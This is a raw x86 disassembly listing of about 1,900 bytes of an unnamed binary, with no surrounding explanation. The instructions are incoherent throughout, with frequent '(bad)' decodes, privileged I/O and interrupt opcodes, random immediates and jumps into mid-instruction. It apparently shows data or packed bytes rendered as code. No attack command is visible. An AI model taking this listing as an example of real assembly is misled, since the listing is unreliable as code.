  40c35d:	jp     0x40c33b
  40c35f:	inc    edx
  40c360:	mov    DWORD PTR [ecx-0x169533e2],esi
  40c366:	jo     0x40c3e3
  40c368:	iret   
  40c369:	xlat   BYTE PTR ds:[ebx]
  40c36a:	bound  ebx,QWORD PTR [edx]
  40c36c:	test   al,0x7
  40c36e:	push   ds
  40c36f:	retf   
  40c370:	shl    BYTE PTR [edi],cl
  40c372:	xor    BYTE PTR [esi],ah
  40c374:	cmp    ebx,DWORD PTR [edx-0x338ce9ea]
  40c37a:	imul   ebx,ebx,0xffffffb5
  40c37d:	xchg   esi,eax
  40c37e:	sbb    cl,BYTE PTR [edi+edi*4+0x24635a87]
  40c385:	mov    edx,0x7f036a8a
  40c38a:	inc    edx
  40c38b:	pop    eax
  40c38c:	fnsave [ecx]
  40c38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c38f:	mov    ecx,0x2784a9de
  40c394:	fcmovb st,st(4)
  40c396:	jg     0x40c3f5
  40c398:	push   0x5c
  40c39a:	and    eax,0x3d969e32
  40c39f:	ins    DWORD PTR es:[edi],dx
  40c3a0:	adc    bl,BYTE PTR [ebp+0x429cd888]
  40c3a6:	mov    ch,dl
  40c3a8:	lods   eax,DWORD PTR ds:[esi]
  40c3a9:	iret   
  40c3aa:	in     al,0x19
  40c3ac:	imul   edx,DWORD PTR [esi],0xffffffb1
  40c3af:	adc    dl,ah
  40c3b1:	icebp  
  40c3b2:	div    DWORD PTR [esi]
  40c3b4:	into   
  40c3b5:	mov    BYTE PTR [ebx],bl
  40c3b7:	scas   al,BYTE PTR es:[edi]
  40c3b8:	inc    ebx
  40c3b9:	ja     0x40c357
  40c3bb:	jmp    0x40c427
  40c3bd:	mov    bh,0x7a
  40c3bf:	sub    BYTE PTR [edi-0x58aea1ca],bh
  40c3c5:	or     ebx,DWORD PTR [esi-0x23b9f8bb]
  40c3cb:	and    DWORD PTR [esi+ecx*1],0xf9d08dc4
  40c3d2:	mov    ebx,0x2e51d3ee
  40c3d7:	or     DWORD PTR [esi+0x54ebb496],esi
  40c3dd:	and    BYTE PTR [ebp-0x1e8e85d8],al
  40c3e3:	mov    edi,0xa2a77cc5
  40c3e8:	push   0xf6fa70e4
  40c3ed:	and    BYTE PTR [eax],dl
  40c3ef:	imul   DWORD PTR [ebx]
  40c3f1:	inc    eax
  40c3f2:	repz and BYTE PTR [esi],bh
  40c3f5:	dec    edi
  40c3f6:	lea    esp,[ebx]
  40c3f8:	pop    esi
  40c3f9:	int    0x6e
  40c3fb:	repnz mov al,0xf1
  40c3fe:	sar    DWORD PTR ds:0x6cc0f15d,cl
  40c404:	inc    ecx
  40c405:	mov    ds:0x102709f3,al
  40c40a:	call   0x8d01:0x96eff38d
  40c411:	jge    0x40c3d5
  40c413:	sub    edx,esi
  40c415:	sbb    edx,esp
  40c417:	aad    0xfb
  40c419:	add    ebx,eax
  40c41b:	(bad)  
  40c41c:	mov    ebp,0x6e149019
  40c421:	dec    eax
  40c422:	mov    bl,0x9b
  40c424:	mov    eax,0x49d705a3
  40c429:	jb     0x40c42a
  40c42b:	gs cs cmc 
  40c42e:	loop   0x40c446
  40c430:	std    
  40c431:	ftst   
  40c433:	test   DWORD PTR [ecx],edi
  40c435:	pushf  
  40c436:	out    dx,eax
  40c437:	xor    eax,0x63b4c1a2
  40c43c:	(bad)  
  40c43d:	xor    eax,0xba1b3517
  40c442:	mov    ah,0x2a
  40c444:	sub    bl,BYTE PTR [ebx-0x417ec769]
  40c44a:	pop    ebx
  40c44b:	push   ecx
  40c44c:	outs   dx,BYTE PTR ds:[esi]
  40c44d:	mov    al,0x32
  40c44f:	pop    eax
  40c450:	sahf   
  40c451:	stos   DWORD PTR es:[edi],eax
  40c452:	mov    ch,0x9c
  40c454:	jg     0x40c47a
  40c456:	sub    edi,DWORD PTR [esi+0x3f]
  40c459:	pushf  
  40c45a:	mov    cl,bh
  40c45c:	xchg   ebx,eax
  40c45d:	xchg   edi,eax
  40c45e:	dec    esi
  40c45f:	les    ebp,FWORD PTR ds:0xdedd5eab
  40c465:	push   esp
  40c466:	clc    
  40c467:	iret   
  40c468:	hlt    
  40c469:	add    eax,0xed82aebd
  40c46e:	int    0x21
  40c470:	ss call 0x2629b7ab
  40c476:	jmp    0x40c439
  40c478:	xchg   DWORD PTR [ecx-0x50],edi
  40c47b:	push   es
  40c47c:	and    al,0x62
  40c47e:	mov    al,ds:0x3651974f
  40c483:	pusha  
  40c484:	mov    dh,0x76
  40c486:	mov    ebp,0x4c3b998d
  40c48b:	(bad)
  40c48e:	rcr    BYTE PTR [esi+0x20],cl
  40c491:	(bad)
  40c494:	xor    DWORD PTR [esi+edi*2-0x68],edx
  40c498:	sahf   
  40c499:	xchg   esi,eax
  40c49a:	xchg   edx,eax
  40c49b:	xchg   BYTE PTR [ebp+0x6f],al
  40c49e:	test   DWORD PTR [ebp+0x4c32099e],0xc7ccf331
  40c4a8:	gs ss (bad) 
  40c4ab:	xchg   ecx,eax
  40c4ac:	popa   
  40c4ad:	dec    ecx
  40c4ae:	mov    eax,0xc232b0bb
  40c4b3:	fidivr DWORD PTR [ebx]
  40c4b5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c4b7:	jns    0x40c4d2
  40c4b9:	or     eax,0x758b03cd
  40c4be:	sti    
  40c4bf:	adc    eax,0xc95fd0b1
  40c4c4:	dec    edi
  40c4c5:	ficom  DWORD PTR [ebp+0x63c14d03]
  40c4cb:	add    ebx,edi
  40c4cd:	xchg   ebp,eax
  40c4ce:	xchg   ecx,eax
  40c4cf:	push   ebx
  40c4d0:	xchg   esi,eax
  40c4d1:	add    DWORD PTR [ebx-0x75],0x3a
  40c4d5:	repnz test BYTE PTR [edx-0x55ea638e],ch
  40c4dc:	cs pop edx
  40c4de:	aad    0xca
  40c4e0:	jmp    0xdf85:0xc17198c4
  40c4e7:	aam    0x27
  40c4e9:	xlat   BYTE PTR ds:[ebx]
  40c4ea:	aas    
  40c4eb:	out    dx,al
  40c4ec:	in     al,dx
  40c4ed:	pop    ebp
  40c4ee:	push   ds
  40c4ef:	leave  
  40c4f0:	loop   0x40c4ed
  40c4f2:	push   ss
  40c4f3:	xor    dh,BYTE PTR [eax+edx*4]
  40c4f6:	js     0x40c559
  40c4f8:	inc    esp
  40c4f9:	(bad)  
  40c4fa:	cmpxchg BYTE PTR [eax-0x61],bl
  40c4fe:	push   ss
  40c4ff:	pop    es
  40c500:	test   DWORD PTR [ecx-0x60],ecx
  40c503:	js     0x40c4c2
  40c505:	rol    BYTE PTR ds:0xaaaa5900,cl
  40c50b:	xchg   BYTE PTR [esi],dl
  40c50d:	and    eax,DWORD PTR [eax-0x64]
  40c510:	sahf   
  40c511:	(bad)  [edx+0xe]
  40c514:	adc    dl,al
  40c516:	data16 aas 
  40c518:	xor    eax,0xdae8c23e
  40c51d:	push   ebp
  40c51e:	sbb    al,0x12
  40c520:	mov    cl,BYTE PTR [ecx-0x6092b5a0]
  40c526:	out    dx,eax
  40c527:	mov    ebx,DWORD PTR [ebp+0x7]
  40c52a:	push   0xdb8f6d36
  40c52f:	or     DWORD PTR [ecx-0x7f],ecx
  40c532:	mov    ds:0x19498940,eax
  40c537:	sub    dl,ah
  40c539:	pop    edx
  40c53a:	scas   al,BYTE PTR es:[edi]
  40c53b:	add    ebx,DWORD PTR [ecx]
  40c53d:	add    al,0xa4
  40c53f:	push   eax
  40c540:	test   al,0x7b
  40c542:	(bad)  
  40c543:	jl     0x40c59d
  40c545:	jns    0x40c58c
  40c547:	ret    0xce40
  40c54a:	cmp    ebp,0xffffff8f
  40c54d:	dec    ebp
  40c54e:	dec    edi
  40c54f:	sahf   
  40c550:	sbb    BYTE PTR [edi-0x71],dh
  40c553:	stos   BYTE PTR es:[edi],al
  40c554:	mov    cs,WORD PTR [edi+0x3e]
  40c557:	mov    ch,0xd
  40c559:	cmp    DWORD PTR [ebx],eax
  40c55b:	shl    edx,cl
  40c55d:	xor    al,0x99
  40c55f:	in     eax,dx
  40c560:	pop    eax
  40c561:	aam    0xba
  40c563:	pushf  
  40c564:	inc    ebx
  40c565:	inc    esp
  40c566:	or     al,0xa9
  40c568:	repz dec esi
  40c56a:	pop    es
  40c56b:	sahf   
  40c56c:	repz daa 
  40c56e:	add    esi,DWORD PTR [ecx-0x5ebdf7ad]
  40c574:	xor    eax,0xf974b6b0
  40c579:	pandn  mm3,QWORD PTR [edx+edx*4+0x798c76a]
  40c581:	fdiv   QWORD PTR [ebx-0x172ac56c]
  40c587:	jno    0x40c5d7
  40c589:	xor    esi,esi
  40c58b:	xor    eax,0x8ca2aa9f
  40c590:	leave  
  40c591:	pop    edi
  40c592:	icebp  
  40c593:	xor    bl,BYTE PTR [esi+0x12839afd]
  40c599:	and    ch,BYTE PTR [eax+0x68]
  40c59c:	or     ah,BYTE PTR [ecx+0x19]
  40c59f:	aas    
  40c5a0:	jmp    0xb9defb2
  40c5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a6:	jmp    0xbe975015
  40c5ab:	(bad)  
  40c5ac:	(bad)  
  40c5ad:	push   esi
  40c5ae:	push   ds
  40c5af:	aaa    
  40c5b0:	in     al,dx
  40c5b1:	push   0xffffff8d
  40c5b3:	mov    eax,ds:0x653dd504
  40c5b8:	aad    0xb8
  40c5ba:	arpl   WORD PTR [esi],dx
  40c5bc:	jb     0x40c57b
  40c5be:	sub    al,0xf7
  40c5c0:	push   ss
  40c5c1:	shl    edi,cl
  40c5c3:	xor    eax,0x6f9af541
  40c5c8:	mov    ebp,DWORD PTR ds:0xa8dc4b8d
  40c5ce:	cld    
  40c5cf:	add    al,0x69
  40c5d1:	test   al,0x53
  40c5d3:	push   esi
  40c5d4:	jbe    0x40c61b
  40c5d6:	xlat   BYTE PTR ds:[ebx]
  40c5d7:	jge    0x40c5d1
  40c5d9:	push   0x15a6aecd
  40c5de:	and    DWORD PTR [ecx-0x6fd1b2e6],0xffffff8e
  40c5e5:	ret    0x5db4
  40c5e8:	cmp    DWORD PTR [ebx+0x4ed98545],0x5f
  40c5ef:	sbb    dl,dl
  40c5f1:	xchg   ebx,eax
  40c5f2:	sub    DWORD PTR [ebp+0x4c],ecx
  40c5f5:	pop    ecx
  40c5f6:	pop    edx
  40c5f7:	ret    
  40c5f8:	sbb    al,0x7e
  40c5fa:	and    esp,DWORD PTR [eax-0x17]
  40c5fd:	inc    ecx
  40c5fe:	sub    eax,0x814fe8d7
  40c603:	lea    dx,[esi+0x66]
  40c607:	ret    0xef68
  40c60a:	adc    al,BYTE PTR [esi]
  40c60c:	jno    0x40c604
  40c60e:	pop    es
  40c60f:	out    dx,eax
  40c610:	jg     0x40c657
  40c612:	push   0x50
  40c614:	xchg   edx,eax
  40c615:	bound  esi,QWORD PTR [ebp+edx*8-0x1073e038]
  40c61c:	inc    eax
  40c61d:	imul   eax,DWORD PTR [edi-0x2c],0xffffffa1
  40c621:	cdq    
  40c622:	xchg   ebx,eax
  40c623:	and    eax,0x4ea01e84
  40c628:	jo     0x40c5c5
  40c62a:	ins    BYTE PTR es:[edi],dx
  40c62b:	adc    DWORD PTR [edx+0x3e3cd578],edi
  40c631:	mov    ebx,DWORD PTR [edi-0x17f67126]
  40c637:	(bad)  
  40c638:	rol    BYTE PTR [ecx-0x49d6694e],1
  40c63e:	imul   esp,DWORD PTR [ecx-0x34],0x9c95aea2
  40c645:	and    bh,BYTE PTR [ecx-0x79]
  40c648:	in     eax,dx
  40c649:	gs aas 
  40c64b:	xlat   BYTE PTR ds:[ebx]
  40c64c:	mov    al,ds:0x9c00459e
  40c651:	cmp    edi,DWORD PTR [edx-0x6c]
  40c654:	rcl    DWORD PTR [esp+eiz*4+0xfa05b4f],cl
  40c65b:	cli    
  40c65c:	sahf   
  40c65d:	sbb    eax,0x3f1ed04
  40c662:	cmp    ebp,ebx
  40c664:	jp     0x40c694
  40c666:	jge    0x40c631
  40c668:	in     al,dx
  40c669:	mov    al,0xf7
  40c66b:	leave  
  40c66c:	outs   dx,BYTE PTR ds:[esi]
  40c66d:	push   ds
  40c66e:	scas   eax,DWORD PTR es:[edi]
  40c66f:	(bad)  [eax+0x1b80b808]
  40c675:	leave  
  40c676:	out    0xf2,al
  40c678:	sbb    al,0x5e
  40c67a:	add    edi,DWORD PTR [ebx+0xc57f9f4]
  40c680:	jbe    0x40c6ea
  40c682:	fs int 0x7d
  40c685:	(bad)
  40c689:	sub    esp,DWORD PTR [eax-0x42d35ccf]
  40c68f:	and    DWORD PTR [edx-0x5157ec6c],0x34
  40c696:	push   es
  40c697:	ret    
  40c698:	fcom   QWORD PTR [ebp-0x79]
  40c69b:	scas   al,BYTE PTR es:[edi]
  40c69c:	adc    edx,edx
  40c69e:	jnp    0x40c6d3
  40c6a0:	push   ebx
  40c6a1:	add    bl,BYTE PTR [ecx+0x3c0a7c16]
  40c6a7:	(bad)  
  40c6a8:	jnp    0x40c65b
  40c6aa:	xchg   edx,eax
  40c6ab:	popf   
  40c6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ad:	fidivr DWORD PTR [eax-0x78]
  40c6b0:	fdiv   st(3),st
  40c6b2:	js     0x40c691
  40c6b4:	je     0x40c698
  40c6b6:	(bad)  
  40c6b7:	xor    eax,0x99eefbb1
  40c6bc:	pcmpeqb mm3,QWORD PTR [ecx-0x80]
  40c6c0:	pop    eax
  40c6c1:	jns    0x40c65e
  40c6c3:	and    eax,0x41f8b18e
  40c6c8:	dec    eax
  40c6c9:	cmp    edi,0xf4c3411b
  40c6cf:	ins    DWORD PTR es:[edi],dx
  40c6d0:	fsub   st(4),st
  40c6d2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c6d4:	mov    ch,0x97
  40c6d6:	jecxz  0x40c733
  40c6d8:	or     al,0xd9
  40c6da:	add    DWORD PTR [edx+edi*4],0x2d3bf291
  40c6e1:	pop    esp
  40c6e2:	inc    edx
  40c6e3:	fnstenv [ebx-0xf]
  40c6e6:	xchg   ecx,eax
  40c6e7:	rcl    BYTE PTR [esi+0x35],1
  40c6ea:	je     0x40c6ae
  40c6ec:	jmp    ebx
  40c6ee:	xor    al,0xfb
  40c6f0:	aaa    
  40c6f1:	sub    ah,BYTE PTR [esi+0x520afb11]
  40c6f7:	jle    0x40c6b8
  40c6f9:	in     eax,0x29
  40c6fb:	icebp  
  40c6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6fd:	mov    dl,0x4a
  40c6ff:	xor    BYTE PTR ds:0x6e7ca13c,bl
  40c705:	mov    ebx,0x276ee97e
  40c70a:	imul   edi,DWORD PTR [ebx-0xd],0xf
  40c70e:	jmp    FWORD PTR [eax]
  40c710:	cdq    
  40c711:	mov    ebp,0x7ce117b3
  40c716:	and    DWORD PTR [edx],ebp
  40c718:	push   edi
  40c719:	out    dx,al
  40c71a:	or     DWORD PTR [edx],edi
  40c71c:	ins    DWORD PTR es:[edi],dx
  40c71d:	int3   
  40c71e:	test   BYTE PTR [edi],ah
  40c720:	inc    eax
  40c721:	rol    DWORD PTR [eax+0x258f78f7],1
  40c727:	jl     0x40c70f
  40c729:	ins    BYTE PTR es:[edi],dx
  40c72a:	and    BYTE PTR [ebx],bl
  40c72c:	je     0x40c73d
  40c72e:	xchg   DWORD PTR [eax-0x66483db5],edi
  40c734:	sbb    al,0xd2
  40c736:	adc    ebp,ebx
  40c738:	shl    BYTE PTR [esi-0x77],0xd
  40c73c:	retf   0xf110
  40c73f:	js     0x40c77b
  40c741:	xchg   edx,eax
  40c742:	xchg   BYTE PTR [esi],ah
  40c744:	add    eax,0xb37c9818
  40c749:	push   es
  40c74a:	xchg   ecx,eax
  40c74b:	cld    
  40c74c:	pop    ds
  40c74d:	sub    al,0xaf
  40c74f:	adc    al,0x9e
  40c751:	leave  
  40c752:	add    eax,DWORD PTR [edx+ebx*2-0x6c]
  40c756:	add    edi,ebx
  40c758:	pop    edx
  40c759:	ins    DWORD PTR es:[edi],dx
  40c75a:	ret    0x4f45
  40c75d:	add    ecx,edi
  40c75f:	lds    ecx,FWORD PTR [ebp+0x33]
  40c762:	mov    ebp,DWORD PTR [edi]
  40c764:	jle    0x40c731
  40c766:	(bad)  
  40c767:	imul   esi,esp,0x5bcaedb3
  40c76d:	lods   eax,DWORD PTR ds:[esi]
  40c76e:	push   esi
  40c76f:	ins    BYTE PTR es:[edi],dx
  40c770:	pusha  
  40c771:	mov    bl,0x71
  40c773:	out    0x6d,eax
  40c775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c776:	mov    ah,0xa6
  40c778:	and    BYTE PTR [eax+0x72],al
  40c77b:	(bad)  
  40c77c:	std    
  40c77d:	(bad)  
  40c77f:	mov    eax,0xad574843
  40c784:	add    al,0x8b
  40c786:	xchg   edi,eax
  40c787:	cmp    eax,0xf7f84b2
  40c78c:	adc    DWORD PTR [edi-0x60556871],edx
  40c792:	sub    BYTE PTR [eax],bh
  40c794:	push   esp
  40c795:	outs   dx,BYTE PTR ds:[esi]
  40c796:	mov    ebx,0x54fe5a06
  40c79b:	jns    0x40c787
  40c79d:	test   eax,0x6963cb6a
  40c7a2:	xchg   ebp,eax
  40c7a3:	fnstenv [edx-0x3e]
  40c7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a7:	cwde   
  40c7a8:	inc    ecx
  40c7a9:	cli    
  40c7aa:	repnz nop
  40c7ac:	cwde   
  40c7ad:	xchg   edx,eax
  40c7ae:	int3   
  40c7af:	xor    eax,0x9a829824
  40c7b4:	std    
  40c7b5:	push   esi
  40c7b6:	pusha  
  40c7b7:	ficomp DWORD PTR [ebx-0x7b9a905c]
  40c7bd:	mov    DWORD PTR [ecx+0x5986c423],ebp
  40c7c3:	(bad)  
  40c7c4:	pop    ebx
  40c7c5:	jecxz  0x40c77c
  40c7c7:	clc    
  40c7c8:	sub    BYTE PTR [ebp+0x37],al
  40c7cb:	iret   
  40c7cc:	test   DWORD PTR gs:[ebx+0x9c756e6],edx
  40c7d3:	xchg   esp,eax
  40c7d4:	mov    cl,0xec
  40c7d6:	mov    edi,0xa9c575bd
  40c7db:	jb     0x40c7f4
  40c7dd:	mov    eax,0x2bad03c7
  40c7e2:	xchg   esi,eax
  40c7e3:	jle    0x40c82a
  40c7e5:	mov    esi,0x8fbb8ff5
  40c7ea:	lods   al,BYTE PTR ds:[esi]
  40c7eb:	add    eax,0x75ef76f1
  40c7f0:	aas    
  40c7f1:	js     0x40c828
  40c7f3:	ficomp DWORD PTR [ebx-0x112f9437]
  40c7f9:	clc    
  40c7fa:	mov    ah,0x4
  40c7fc:	iret   
  40c7fd:	jo     0x40c7ca
  40c7ff:	mov    ecx,0x9c1ebca0
  40c804:	sub    ebx,DWORD PTR [eax]
  40c806:	ds hlt 
  40c808:	neg    DWORD PTR [ecx-0x5b315a65]
  40c80e:	imul   edx,DWORD PTR [ecx+0x6],0xffffffb5
  40c812:	out    dx,eax
  40c813:	das    
  40c814:	mov    esp,0x97715a69
  40c819:	or     ebp,eax
  40c81b:	jnp    0x40c83b
  40c81d:	sbb    al,0x73
  40c81f:	scas   eax,DWORD PTR es:[edi]
  40c820:	lock adc DWORD PTR [ebx],ecx
  40c823:	cwde   
  40c824:	mov    ebp,0xfa9c5978
  40c829:	add    al,0xed
  40c82b:	add    DWORD PTR [edx-0x45],eax
  40c82e:	and    dl,BYTE PTR [eax-0x7c414c6b]
  40c834:	dec    ecx
  40c835:	pop    ebp
  40c836:	sar    BYTE PTR [ecx+eax*4],cl
  40c839:	in     al,0x3e
  40c83b:	arpl   WORD PTR [edx-0x48f5c1e6],si
  40c841:	xor    ch,BYTE PTR [esi]
  40c843:	jecxz  0x40c85f
  40c845:	inc    esp
  40c846:	jae    0x40c8c4
  40c848:	or     eax,0x6e69caea
  40c84d:	(bad)  
  40c84e:	hlt    
  40c84f:	(bad)
  40c854:	cmp    ebp,DWORD PTR [esi+0x1fdf1132]
  40c85a:	lock sub esp,DWORD PTR [ebx-0x10]
  40c85e:	xor    cl,cl
  40c860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c861:	outs   dx,BYTE PTR ds:[esi]
  40c862:	cmp    edi,edx
  40c864:	mov    al,ds:0xc7fc9758
  40c869:	jl     0x40c859
  40c86b:	push   ss
  40c86c:	pop    esp
  40c86d:	sub    DWORD PTR [ebx],edx
  40c86f:	aaa    
  40c870:	cld    
  40c871:	scas   al,BYTE PTR es:[edi]
  40c872:	inc    ebx
  40c873:	stc    
  40c874:	pop    es
  40c875:	cli    
  40c876:	mov    BYTE PTR ds:0xa8d9d652,0x23
  40c87d:	or     DWORD PTR [ecx-0x48],esp
  40c880:	push   esp
  40c881:	and    eax,0x4790ee97
  40c886:	das    
  40c887:	add    esi,DWORD PTR [esi]
  40c889:	ret    0xb3dc
  40c88c:	inc    ebp
  40c88d:	xchg   ebp,eax
  40c88e:	push   edx
  40c88f:	in     eax,dx
  40c890:	pop    ds
  40c891:	or     eax,0x91af4b15
  40c896:	retf   0xb3b3
  40c899:	call   0x809acedf
  40c89e:	and    cl,bl
  40c8a0:	lahf   
  40c8a1:	sbb    eax,0x5ddea4b0
  40c8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a7:	mov    esi,0x80251b21
  40c8ac:	sahf   
  40c8ad:	push   es
  40c8ae:	mov    esi,0xafd420b1
  40c8b3:	jg     0x40c836
  40c8b5:	imul   eax,DWORD PTR [eax],0xffffffc5
  40c8b8:	xchg   ecx,eax
  40c8b9:	fwait
  40c8ba:	jle    0x40c8da
  40c8bc:	imul   ebx,DWORD PTR [ebx+0x8],0xfffffff1
  40c8c0:	in     eax,0x47
  40c8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8c3:	les    ecx,FWORD PTR ds:[edx+ebx*2+0x17535378]
  40c8cb:	xor    bh,cl
  40c8cd:	dec    esp
  40c8ce:	inc    ebx
  40c8cf:	and    ebx,DWORD PTR [ebx]
  40c8d1:	out    dx,eax
  40c8d2:	push   cs
  40c8d3:	imul   ecx,DWORD PTR ss:[edx+0x46],0xdee744fa
  40c8db:	mov    ebp,0x27f4532d
  40c8e0:	popa   
  40c8e1:	mov    edi,DWORD PTR [edx+0x6a7de73a]
  40c8e7:	xor    DWORD PTR [ecx-0x4c],0xe718fa5
  40c8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8ef:	adc    ah,BYTE PTR [edi]
  40c8f1:	sbb    eax,0x8e9703b
  40c8f6:	sti    
  40c8f7:	push   eax
  40c8f8:	out    0x8d,al
  40c8fa:	push   0xd3027ff8
  40c8ff:	push   0x4dfadeb8
  40c904:	dec    ecx
  40c905:	mov    ecx,0x6f066133
  40c90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c90b:	loop   0x40c95c
  40c90d:	sar    DWORD PTR [esi+0x27474791],0xeb
  40c914:	je     0x40c935
  40c916:	cmc    
  40c917:	pop    eax
  40c918:	or     dh,al
  40c91a:	arpl   WORD PTR [esi-0x7c],bp
  40c91d:	add    BYTE PTR [ebx-0x53],0x3b
  40c921:	mov    al,BYTE PTR [edx+0x2e]
  40c924:	inc    esp
  40c925:	and    eax,0xad67c667
  40c92a:	(bad)  
  40c92b:	add    dh,BYTE PTR [edi+0x313a5b2f]
  40c931:	jl     0x40c989
  40c933:	mov    esi,0x36180a6f
  40c938:	adc    DWORD PTR [ecx-0x6f02df4a],esp
  40c93e:	mov    esp,DWORD PTR [edx]
  40c940:	outs   dx,BYTE PTR ds:[esi]
  40c941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c942:	jmp    0x40c90a
  40c944:	xor    DWORD PTR [eax+0x23],esp
  40c947:	cld    
  40c948:	mov    esi,0x9240c350
  40c94d:	jmp    0x1c128884
  40c952:	pop    edi
  40c953:	mov    edi,0x66c9fad6
  40c958:	rcl    BYTE PTR [esi+0x199afe74],1
  40c95e:	in     eax,0x7e
  40c960:	push   ebx
  40c961:	jns    0x40c91c
  40c963:	push   0x6b
  40c965:	(bad)  
  40c966:	sti    
  40c967:	push   0xffffff9b
  40c969:	in     eax,0xc
  40c96b:	cmp    eax,0x424f2108
  40c970:	jp     0x40c973
  40c972:	inc    ebp
  40c973:	push   ebx
  40c974:	add    dh,BYTE PTR [ebx+edi*2]
  40c977:	arpl   sp,sp
  40c979:	push   edi
  40c97a:	imul   edx,DWORD PTR [edx-0x38aca43e],0x92837864
  40c984:	sub    cl,BYTE PTR [edi+0x3498077c]
  40c98a:	inc    edi
  40c98b:	js     0x40c91e
  40c98d:	add    al,0xfb
  40c98f:	int3   
  40c990:	sbb    al,0xa5
  40c992:	mov    edi,0xc77eabc8
  40c998:	ret    0xe7fb
  40c99b:	dec    esi
  40c99c:	mov    gs,WORD PTR [ebp-0xd]
  40c99f:	mov    DWORD PTR [edx],ecx
  40c9a1:	push   cs
  40c9a2:	test   al,0xc6
  40c9a4:	jo     0x40ca17
  40c9a6:	pop    esp
  40c9a7:	sbb    ecx,DWORD PTR [ebx+0x2a]
  40c9aa:	fs push ss
  40c9ac:	add    DWORD PTR [edx],esp
  40c9ae:	test   DWORD PTR [ecx],ecx
  40c9b0:	call   0xfef11302
  40c9b5:	cld    
  40c9b6:	lds    esi,FWORD PTR ds:0x35cf49fa
  40c9bc:	xor    bh,cl
  40c9be:	mov    dl,0xc0
  40c9c0:	daa    
  40c9c1:	popa   
  40c9c2:	imul   esi,DWORD PTR [ebx],0x170a1619
  40c9c8:	stos   DWORD PTR es:[edi],eax
  40c9c9:	mov    bl,0x7d
  40c9cb:	xor    esp,DWORD PTR [esi]
  40c9cd:	aam    0x6f
  40c9cf:	or     bl,dl
  40c9d1:	push   esp
  40c9d2:	lahf   
  40c9d3:	push   0xdda7ae95
  40c9d8:	jl     0x40c9c1
  40c9da:	fild   WORD PTR [eax]
  40c9dc:	test   BYTE PTR [ebx],ah
  40c9de:	cld    
  40c9df:	jo     0x40ca19
  40c9e1:	cwde   
  40c9e2:	mov    ecx,?
  40c9e4:	retf   0xb18a
  40c9e7:	xchg   ebx,eax
  40c9e8:	fcom   QWORD PTR [edx+ebp*8-0x21]
  40c9ec:	cmp    al,BYTE PTR [ebx+0x2250a573]
  40c9f2:	(bad)  
  40c9f3:	rcr    dh,1
  40c9f5:	mov    ecx,0x62bb03da
  40c9fa:	or     eax,DWORD PTR [ecx+eiz*2]
  40c9fd:	lods   al,BYTE PTR ds:[esi]
  40c9fe:	sbb    eax,0x5e8d7d28
  40ca03:	fisubr WORD PTR [eax-0x1bdc93c0]
  40ca09:	pop    eax
  40ca0a:	jecxz  0x40c9fd
  40ca0c:	sub    eax,0xb7c75bc8
  40ca11:	out    0x47,eax
  40ca13:	lods   eax,DWORD PTR ds:[esi]
  40ca14:	sbb    al,0xa4
  40ca16:	fcomp  DWORD PTR [edx-0x6b]
  40ca19:	cld    
  40ca1a:	mov    dl,0x53
  40ca1c:	mov    edi,0x135f8af8
  40ca21:	pop    edx
  40ca22:	xlat   BYTE PTR ds:[ebx]
  40ca23:	ins    BYTE PTR es:[edi],dx
  40ca24:	mov    eax,DWORD PTR [ebp+0x456a1dec]
  40ca2a:	mov    edi,0x59df691e
  40ca2f:	mov    al,ds:0xa0c3b46e
  40ca34:	inc    eax
  40ca35:	cmp    ebp,DWORD PTR [eax+0x72180b9]
  40ca3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3c:	test   al,0xec
  40ca3e:	push   ds
  40ca3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca40:	xor    eax,0xeb12f8a2
  40ca45:	jle    0x40c9db
  40ca47:	int3   
  40ca48:	sbb    edi,DWORD PTR ds:0xab6ed111
  40ca4e:	sbb    edx,0xffffffa9
  40ca51:	in     al,0x9f
  40ca53:	call   0x41de9a88
  40ca58:	in     eax,0xd2
  40ca5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca5b:	adc    ch,BYTE PTR [edi-0x4e]
  40ca5e:	inc    ebp
  40ca5f:	repnz in eax,0x84
  40ca62:	repnz inc edx
  40ca64:	sbb    al,0x2
  40ca66:	enter  0x719f,0xa6
  40ca6a:	jbe    0x40caa5
  40ca6c:	jmp    0x40ca85
  40ca6e:	mov    ecx,?
  40ca70:	sub    eax,DWORD PTR [ebp+0x20ffb081]
  40ca76:	mov    BYTE PTR [ebp-0x35],cl
  40ca79:	les    eax,FWORD PTR [esi+0x7b07fe42]
  40ca7f:	mov    ecx,0x6dec233e
  40ca84:	(bad)  
  40ca85:	js     0x40caf0
  40ca87:	xchg   BYTE PTR [edi],al
  40ca89:	jae    0x40cabb
  40ca8b:	pop    esi
  40ca8c:	(bad)  
  40ca8d:	sbb    BYTE PTR [eax-0x30001707],dl
  40ca93:	mov    ds:0x1c86ef68,eax
  40ca98:	mov    esi,0x91393a9e
  40ca9d:	lods   al,BYTE PTR ds:[esi]
  40ca9e:	div    DWORD PTR [eax-0x54]
  40caa1:	mov    dh,al
  40caa3:	mov    ah,ah
  40caa5:	test   eax,0x250284c2
  40caaa:	fimul  DWORD PTR [esi]
  40caac:	or     eax,0xf0e171a8
  40cab1:	mov    cl,0x6b
  40cab3:	mov    fs,WORD PTR [eax]
  40cab5:	ret    
  40cab6:	and    bl,BYTE PTR [eax+eiz*4+0x4fca47ac]
  40cabd:	sbb    dl,BYTE PTR [edi-0x2d]
  40cac0:	xchg   edx,eax
  40cac1:	retf   
  40cac2:	pop    ebx
  40cac3:	or     al,bl
  40cac5:	scas   eax,DWORD PTR es:[edi]
  40cac6:	fucomp st(4)
